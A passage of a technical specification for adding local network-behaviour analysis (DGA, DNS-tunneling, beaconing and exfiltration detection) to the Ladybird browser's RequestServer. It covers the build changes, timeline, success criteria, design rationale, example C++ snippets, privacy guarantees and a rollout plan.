
```cmake
# Existing RequestServer target...

target_sources(RequestServer PRIVATE
    # Existing sources...
    Connection.cpp
    ConnectionFromClient.cpp
    ConnectionCache.cpp
    # ... other existing files ...

    # NEW: Phase 6 Network Behavioral Analysis
    TrafficMonitor.cpp
    DNSAnalyzer.cpp
    C2Detector.cpp
)

# Add tests
ladybird_test(TestTrafficMonitor LIBS RequestServer)
ladybird_test(TestDNSAnalyzer LIBS RequestServer)
ladybird_test(TestC2Detector LIBS RequestServer)

# Add benchmarks
ladybird_benchmark(BenchmarkTrafficMonitor LIBS RequestServer)
```

### 7.3 Implementation Sequence

**Week 1: DNSAnalyzer (3-4 days)**
1. Day 1: Implement `DNSAnalyzer.h` and basic structure
2. Day 2: Implement DGA detection (entropy, n-grams)
3. Day 3: Implement DNS tunneling detection
4. Day 4: Write unit tests, fix bugs

**Week 1: C2Detector (3-4 days)**
1. Day 1: Implement `C2Detector.h` and basic structure
2. Day 2: Implement beaconing detection (interval analysis)
3. Day 3: Implement exfiltration detection
4. Day 4: Write unit tests, fix bugs

**Week 2: TrafficMonitor (4-5 days)**
1. Day 1-2: Implement `TrafficMonitor.h` and core functionality
2. Day 3: Integrate DNSAnalyzer and C2Detector
3. Day 4: Implement scoring and alert generation
4. Day 5: Write unit tests, fix bugs

**Week 2: Integration (2-3 days)**
1. Day 1: Add IPC protocol methods to RequestServer.ipc
2. Day 2: Integrate with ConnectionFromClient
3. Day 3: Test end-to-end flow, fix issues

**Week 3: Testing & Optimization (5 days)**
1. Day 1-2: Write integration tests
2. Day 3: Performance benchmarking
3. Day 4: Optimize hot paths
4. Day 5: Documentation and code review

### 7.4 Estimated Timeline

- **Total Duration**: 3-3.5 weeks
- **Lines of Code**: ~3000-4000 LOC
- **Test Coverage Target**: >80%
- **Performance Target**: <10ms per analysis

---

## 8. Dependencies

### 8.1 Internal Dependencies

- **AK/**: Core data structures (HashMap, Vector, String)
- **LibCore/**: Threading, event loop
- **LibURL/**: URL parsing
- **LibIPC/**: Inter-process communication
- **LibDatabase/**: SQLite for persistent storage (optional)

### 8.2 External Dependencies

**None required** - all functionality uses existing Ladybird infrastructure.

Optional future enhancements:
- **libicu** (if advanced Unicode domain analysis needed)
- **GeoIP database** (for geographic anomaly detection)

### 8.3 Build Requirements

- C++23 compiler (gcc-14 or clang-20)
- CMake 3.25+
- Existing Ladybird build dependencies

---

## 9. Success Criteria

### 9.1 Functional Requirements

- [ ] **F1**: Detect DGA domains with >90% accuracy
- [ ] **F2**: Detect beaconing patterns with >85% accuracy
- [ ] **F3**: Detect data exfiltration with >80% accuracy
- [ ] **F4**: Detect DNS tunneling with >75% accuracy
- [ ] **F5**: Generate actionable alerts with human-readable explanations
- [ ] **F6**: Persist traffic patterns across browser sessions (optional)
- [ ] **F7**: Allow per-page enable/disable of monitoring
- [ ] **F8**: Provide statistics API for diagnostics

### 9.2 Non-Functional Requirements

- [ ] **NF1**: Performance: <10ms per request analysis (p99)
- [ ] **NF2**: Memory: <50 MB with 10,000 tracked domains
- [ ] **NF3**: CPU: <5% sustained during analysis
- [ ] **NF4**: Latency: No blocking of network requests
- [ ] **NF5**: Reliability: Zero crashes during 24-hour stress test
- [ ] **NF6**: Privacy: No data sent to external servers
- [ ] **NF7**: Graceful degradation: Browser works even if analysis fails
- [ ] **NF8**: Test coverage: >80% line coverage

### 9.3 Validation Tests

**DGA Detection Validation**:
- Test against Alexa Top 10,000 domains (expect <5% false positives)
- Test against known DGA datasets (Bambenek, DGArchive)
- Expect >90% detection rate on DGA domains

**Beaconing Detection Validation**:
- Simulate regular intervals (10s, 30s, 60s) - expect detection
- Simulate irregular traffic - expect no detection
- False positive rate <10% on normal CDN traffic

**Exfiltration Detection Validation**:
- Simulate large uploads (>100 MB) - expect detection
- Simulate normal form submissions - expect no detection
- Correctly identify upload-heavy but legitimate services (Google Drive, Dropbox)

**Performance Validation**:
- Benchmark on low-end hardware (2-core CPU, 4GB RAM)
- Stress test: 1000 requests/second for 1 hour
- Memory leak check with Valgrind

---

## 10. Design Rationale

### 10.1 Key Design Decisions

**1. Why asynchronous analysis?**
- Network requests must not be blocked by analysis
- Background analysis allows for more complex algorithms
- User experience is not impacted by detection latency

**2. Why separate DNSAnalyzer and C2Detector?**
- Single Responsibility Principle
- Easier to test and maintain
- Can be independently optimized
- Allows for future extensions (e.g., ML-based DGA detection)

**3. Why threshold-based scoring (not ML)?**
- Faster inference (<10ms vs. >50ms for ML)
- More interpretable results
- Lower memory footprint
- No training data required
- Can be augmented with ML later (Phase 7)

**4. Why not persist all traffic patterns?**
- Memory constraints (10,000 domains max)
- Privacy concerns (avoid long-term tracking)
- Performance (disk I/O would slow analysis)
- Optional persistence can be added via SQLite integration

**5. Why no SSL/TLS decryption?**
- Privacy violation (man-in-the-middle)
- Legal concerns (GDPR, CCPA)
- Metadata analysis is sufficient for C2 detection
- User trust is paramount

### 10.2 Alternative Approaches Considered

**Alternative 1: ML-based detection for all components**
- Pros: Potentially higher accuracy
- Cons: Higher latency, more complex, requires training data
- Decision: Use threshold-based for Phase 6, ML for Phase 7

**Alternative 2: Kernel-level packet capture**
- Pros: More complete visibility
- Cons: Requires root privileges, platform-specific, privacy concerns
- Decision: Application-level monitoring only

**Alternative 3: External threat intelligence APIs**
- Pros: Access to real-time threat feeds
- Cons: Privacy leakage, network dependency, cost
- Decision: Local-only analysis (federated learning in Phase 3)

### 10.3 Future Enhancements (Phase 7+)

1. **ML-based DGA detection**: Train CNN on character sequences
2. **GeoIP analysis**: Detect connections to unusual geographic regions
3. **Certificate pinning**: Validate SSL certificates for known domains
4. **Behavioral baselines**: Learn per-user normal traffic patterns
5. **SIEM integration**: Export alerts to external security systems
6. **Sandboxing integration**: Trigger sandbox for suspicious downloads
7. **User feedback loop**: Learn from user allow/block decisions

---

## 11. Edge Cases and Error Handling

### 11.1 Edge Cases

**Edge Case 1: High-volume legitimate traffic**
- Example: Streaming media, WebSocket connections
- Solution: Whitelist known CDNs, adjust thresholds per domain category

**Edge Case 2: VPN/Tor/Proxy traffic**
- Example: All traffic routed through single domain
- Solution: Check `page_id` network identity, adjust analysis accordingly

**Edge Case 3: Localhost/internal network traffic**
- Example: Development servers, corporate intranet
- Solution: Bypass monitoring for private IP ranges (192.168.x.x, 10.x.x.x)

**Edge Case 4: Browser extensions making requests**
- Example: Ad blockers, password managers
- Solution: Track initiator context, distinguish extension vs. page requests

**Edge Case 5: Long-lived connections (WebSockets)**
- Example: Chat applications, real-time collaboration
- Solution: Don't count WebSocket frames as separate beacons

### 11.2 Error Handling Patterns

```cpp
// All public APIs return ErrorOr<T>
ErrorOr<TrafficScore> TrafficMonitor::analyze_domain(StringView domain) const
{
    // Validate input
    if (domain.is_empty())
        return Error::from_string_literal("Domain cannot be empty");

    // Check if pattern exists
    auto pattern = get_pattern(domain);
    if (!pattern.has_value())
        return TrafficScore{};  // Return default score for unknown domain

    // Try analysis, catch errors
    auto dga_score = TRY(m_dns_analyzer->analyze_dga(domain));
    auto c2_score = TRY(m_c2_detector->analyze(/* ... */));

    // Combine scores
    TrafficScore score;
    score.dga_score = dga_score.score;
    score.c2_score = c2_score.overall_score;
    // ...

    return score;
}

// Graceful degradation in ConnectionFromClient
void ConnectionFromClient::analyze_traffic_async(String const& domain, u64 page_id)
{
    if (!m_traffic_monitor) {
        dbgln("TrafficMonitor: Not initialized, skipping analysis");
        return;  // Don't fail, just skip
    }

    auto score = m_traffic_monitor->analyze_domain(domain);
    if (score.is_error()) {
        dbgln("TrafficMonitor: Analysis failed: {}", score.error());
        // Log error but don't crash or alert user
        return;
    }

    // Handle successful analysis...
}
```

### 11.3 Resource Limits

```cpp
// Enforce limits to prevent DoS
void TrafficMonitor::record_request(TrafficEvent const& event)
{
    auto domain = extract_domain(event.url);

    // Limit 1: Max patterns tracked
    if (m_patterns.size() >= m_config.max_patterns_tracked) {
        // Evict oldest pattern (LRU)
        evict_oldest_pattern();
    }

    // Limit 2: Max events per pattern
    auto& pattern = m_patterns.ensure(domain);
    if (pattern.events.size() >= m_config.max_events_per_pattern) {
        // Remove oldest event (FIFO)
        pattern.events.remove(0);
    }

    // Add new event
    pattern.events.append(event);
    update_pattern(domain, event);
}
```

---

## 12. Documentation Requirements

### 12.1 User-Facing Documentation

Create `docs/USER_GUIDE_NETWORK_ANALYSIS.md`:
- What is network behavioral analysis?
- How does it protect you?
- What alerts might you see?
- How to enable/disable monitoring
- Privacy guarantees

### 12.2 Developer Documentation

Add to existing architecture docs:
- Component interaction diagrams
- API reference for TrafficMonitor
- Integration guide for new detectors
- Performance tuning guide

### 12.3 Code Comments

All public APIs must have:
```cpp
// Example documentation
/// Analyze a domain for suspicious network behavior.
///
/// This method performs multi-factor analysis including:
/// - DGA (Domain Generation Algorithm) detection
/// - Beaconing pattern analysis
/// - Data exfiltration detection
/// - DNS tunneling detection
///
/// @param domain The domain name to analyze (without protocol)
/// @return TrafficScore with overall risk and detailed indicators
///         Error if domain is invalid or analysis fails
///
/// @note This method is lightweight (<10ms) and can be called frequently.
///       Results are cached internally for performance.
ErrorOr<TrafficScore> analyze_domain(StringView domain) const;
```

---

## 13. Backwards Compatibility

### 13.1 IPC Compatibility

- New IPC methods use asynchronous messages (`=|`) to avoid breaking existing clients
- Clients that don't implement `traffic_alert_detected()` will simply not receive alerts
- Default behavior: monitoring disabled unless explicitly enabled via `enable_traffic_monitoring()`

### 13.2 Configuration Compatibility

- All configuration is in-memory with sensible defaults
- No breaking changes to existing configuration files
- Future: Add `traffic_monitoring` section to `~/.config/ladybird/ladybird.conf`

### 13.3 Database Schema

No database changes required for Phase 6 (all in-memory).

Optional future enhancement: Add table to PolicyGraph database:
```sql
CREATE TABLE IF NOT EXISTS traffic_patterns (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    domain TEXT NOT NULL,
    first_seen INTEGER NOT NULL,
    last_seen INTEGER NOT NULL,
    request_count INTEGER NOT NULL,
    total_bytes_sent INTEGER NOT NULL,
    total_bytes_received INTEGER NOT NULL,
    threat_score REAL,
    is_flagged INTEGER DEFAULT 0
);
```

---

## 14. Security Considerations

### 14.1 Attack Vectors

**Attack 1: DoS via excessive requests**
- Mitigation: Enforce `max_patterns_tracked` limit (10,000 domains)
- Mitigation: LRU eviction of old patterns

**Attack 2: Memory exhaustion**
- Mitigation: Limit events per pattern (100 max)
- Mitigation: Periodic cleanup of expired patterns

**Attack 3: Analysis bypassing**
- Mitigation: Cannot disable monitoring externally (only via IPC from trusted WebContent)
- Mitigation: Alert generation is server-side, not client-controlled

**Attack 4: False alert spam**
- Mitigation: Alert rate limiting per page_id
- Mitigation: Confidence thresholds prevent noisy alerts

### 14.2 Privilege Boundaries

- TrafficMonitor runs in RequestServer (unprivileged sandbox)
- No access to file system (except via SecurityTap)
- No network access except libcurl-managed connections
- IPC rate limiting prevents message flooding

### 14.3 Privacy Guarantees

- **No packet capture**: Only metadata collected (URL, size, timing)
- **No PII**: No cookies, headers, or POST bodies analyzed
- **No external calls**: All analysis local
- **No long-term storage**: Patterns expire after 24 hours
- **User control**: Can disable monitoring per-page
- **Transparent**: All alerts include human-readable explanations

---

## 15. Performance Optimization Strategies

### 15.1 Hot Path Optimizations

```cpp
// Optimize: Use StringView to avoid string copies
ErrorOr<TrafficScore> analyze_domain(StringView domain) const;

// Optimize: Cache expensive calculations
float calculate_shannon_entropy(StringView domain) {
    static HashMap<String, float> entropy_cache;
    if (auto cached = entropy_cache.get(domain))
        return *cached;

    float entropy = /* expensive calculation */;
    entropy_cache.set(domain, entropy);
    return entropy;
}

// Optimize: Early exit on benign traffic
ErrorOr<TrafficScore> analyze_pattern(ConnectionPattern const& pattern) const {
    // Quick checks first (cheap)
    if (pattern.request_count < m_config.min_events_for_analysis)
        return TrafficScore{};  // Not enough data

    if (pattern.upload_ratio < 0.1f)
        return TrafficScore{};  // Clearly not exfiltration

    // Expensive analysis only if needed
    auto dga_score = TRY(m_dns_analyzer->analyze_dga(pattern.domain));
    // ...
}
```

### 15.2 Memory Optimization

```cpp
// Use compact data structures
struct TrafficEvent {
    // Use ByteString (shared string) instead of String where possible
    ByteString method;  // "GET", "POST" - shared instances

    // Use bit fields for boolean flags
    bool is_tls : 1;
    bool is_websocket : 1;
    bool has_user_interaction : 1;

    // Use u32 for status codes (not u64)
    u16 status_code;
};

// Limit vector capacities
Vector<TrafficEvent> events;
events.ensure_capacity(100);  // Pre-allocate to avoid reallocations
```

### 15.3 Async Processing

```cpp
// Use background threads for analysis
void ConnectionFromClient::analyze_traffic_async(String const& domain, u64 page_id)
{
    // Offload to background thread
    Threading::BackgroundAction::create(
        [this, domain, page_id]() {
            // Analysis runs in background, doesn't block request
            auto score = m_traffic_monitor->analyze_domain(domain);
            if (score.is_error()) return;

            // Alert only on high-risk detections
            if (score.value().overall_risk >= 0.6f) {
                // Send IPC alert (async)
                async_traffic_alert_detected(page_id, score.value().to_json());
            }
        });
}
```

---

## 16. Testing Checklist

### 16.1 Unit Test Coverage

- [ ] TrafficMonitor creation and initialization
- [ ] Event recording (single, multiple, overflow)
- [ ] Pattern aggregation (metrics calculation)
- [ ] Benign traffic (low scores)
- [ ] Beaconing detection (regular intervals)
- [ ] Exfiltration detection (high upload ratio)
- [ ] DGA detection (high entropy domains)
- [ ] DNS tunneling detection (many queries)
- [ ] Scoring combination (weighted average)
- [ ] Statistics tracking
- [ ] Pattern cleanup (expiry, LRU eviction)
- [ ] Edge cases (empty domain, no data, overflow)

### 16.2 Integration Test Coverage

- [ ] End-to-end flow: request → analysis → alert
- [ ] IPC message exchange (enable, get_stats, get_alerts)
- [ ] Multi-page isolation (alerts per page_id)
- [ ] Alert rate limiting
- [ ] Graceful degradation (analysis failure)
- [ ] Performance under load (1000 requests/sec)
- [ ] Memory stability (24-hour stress test)
- [ ] Browser restart (pattern persistence)

### 16.3 Manual Testing Scenarios

- [ ] Visit normal websites (expect no alerts)
- [ ] Simulate beaconing with test server
- [ ] Upload large files (expect no false positive on legitimate services)
- [ ] Visit phishing site with DGA domain
- [ ] Enable/disable monitoring via IPC
- [ ] Check statistics after browsing session
- [ ] Verify alerts appear in UI (if implemented)

---

## 17. Rollout Plan

### 17.1 Phase 6 Rollout Stages

**Stage 1: Development Build (Week 1-2)**
- Implement core components
- Unit tests only
- No IPC integration

**Stage 2: Internal Testing (Week 3)**
- Enable IPC integration
- Test with real websites
- Performance benchmarking
- Bug fixes

**Stage 3: Beta Release (Week 4)**
- Merge to master branch
- Monitoring disabled by default
- Opt-in via `enable_traffic_monitoring(page_id, true)`
- Documentation published

**Stage 4: General Availability (Milestone 0.4 Complete)**
- Monitoring enabled by default (opt-out)
- UI integration (alerts dialog)
- User guide published
- Performance monitoring in production

### 17.2 Rollback Plan

If critical issues discovered:
1. Disable monitoring via configuration flag
2. Revert IPC integration commits
3. Keep core components for future fixes
4. Communicate issue to users transparently

---

## 18. Conclusion

Phase 6 Network Behavioral Analysis completes Milestone 0.4's advanced threat detection capabilities. This specification provides a comprehensive blueprint for implementing:

- **TrafficMonitor**: Central traffic pattern analysis
- **DNSAnalyzer**: DGA and DNS tunneling detection
- **C2Detector**: Beaconing and exfiltration detection

The design prioritizes:
✅ **Performance**: <10ms analysis, <5% CPU overhead
✅ **Privacy**: Local-only, no external API calls
✅ **Reliability**: Graceful degradation, no request blocking
✅ **Extensibility**: Plugin architecture for future detectors
✅ **Testability**: >80% code coverage target

**Next Steps**:
1. Review and approve this specification
2. Begin implementation (Week 1: DNSAnalyzer + C2Detector)
3. Weekly progress reviews
4. Integration testing after Week 2
5. Performance optimization in Week 3

**Success Metrics**:
- DGA detection: >90% accuracy
- Beaconing detection: >85% accuracy
- Exfiltration detection: >80% accuracy
- Performance: <10ms p99 latency
- Zero blocking of legitimate traffic

---

**Document Status**: Ready for Implementation
**Estimated Completion**: 3-3.5 weeks
**Prerequisites**: Phase 1-5 Complete ✅
**Dependencies**: None (uses existing Ladybird infrastructure)

---

*Created: 2025-11-01*
*Ladybird Browser - Sentinel Network Behavioral Analysis*
*Milestone 0.4 Phase 6 Technical Specification v1.0*
